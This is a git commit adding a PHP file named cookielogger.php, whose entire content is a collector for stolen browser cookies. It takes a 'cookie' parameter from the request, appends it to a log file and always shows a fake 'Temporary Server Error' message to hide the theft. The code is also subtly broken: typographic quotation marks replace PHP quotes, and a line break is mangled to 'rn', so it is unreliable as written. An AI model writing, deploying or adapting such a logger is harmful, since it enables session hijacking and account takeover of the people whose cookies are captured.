61f7f24ff2508e46f49364712232ac78f3780e24
jordyjoestar <66799726+jordyjoestar@users.noreply.github.com>
2020-06-29 20:02:49 +0100

    Add files via upload

---
+++ cookielogger.php
@@ -0,0 +1,22 @@
+$filename = “logfile.txt”;
+if (isset($_GET[“cookie”]))
+{
+if (!$handle = fopen($filename, ‘a’))
+{
+echo “Temporary Server Error,Sorry for the inconvenience.”;
+exit;
+}
+else
+{
+if (fwrite($handle, “rn” . $_GET[“cookie”]) === FALSE)
+{
+echo “Temporary Server Error,Sorry for the inconvenience.”;
+exit;
+}
+}
+echo “Temporary Server Error,Sorry for the inconvenience.”;
+fclose($handle);
+exit;
+}
+echo “Temporary Server Error,Sorry for the inconvenience.”;
+exit;
